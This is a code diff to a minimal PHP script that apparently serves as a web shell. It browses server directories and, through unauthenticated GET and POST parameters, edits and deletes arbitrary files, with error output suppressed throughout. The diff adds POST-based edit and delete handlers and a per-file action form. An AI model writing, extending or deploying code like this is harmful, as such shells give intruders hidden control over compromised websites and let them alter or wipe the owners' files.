@@ -1,4 +1,5 @@
 <?php 
+error_reporting(0);
 @define('SEP', '/');
 function pwd() {
 	$pwd = @str_replace('\\', '/', @getcwd());
@@ -57,6 +58,11 @@ if (isset($_GET['dir'])) {
 if (@$_GET['action'] == 'edit' and isset($_GET['files'])) {
 	@edit($_GET['files']);
 }
+if (isset($_GET['action']) && $_POST['do'] == 'edit' and isset($_POST['files'])) {
+	@edit($_POST['files']);
+} elseif ($_POST['do'] == 'delete_file' and isset($_POST['files'])) {
+	@delete($_POST['files']);
+}
 cwd();
 ?>
 <table>
@@ -76,7 +82,17 @@ foreach (@scdir() as $dir) {
 }
 foreach (@scdir() as $file) {
 	if(!is_file($file)) continue;
-	$tools = "<center>--</center>";
+	$tools = "<center>
+	          <form method='post' action='?action&dir=".@base64_encode(@pwd())."'>
+	          <select name='do'>
+	          <option name=''>Select</option>
+	          <option value='edit'>edit</option>
+	          <option value='delete_file'>Delete</option>
+	          </select>
+	          <input type='hidden' name='files' value='".$file."'>
+	          <input type='submit' value='>'>
+	          </form></center>";
 	print("<tr><td>");
-	print("<a href='?action=edit&dir=".@pwd()."&files=".$file."'>".$file."</a></td>");
+	print("<a href=''>".$file."</a></td>");
+	print("<td>".$tools."</td>");
 }
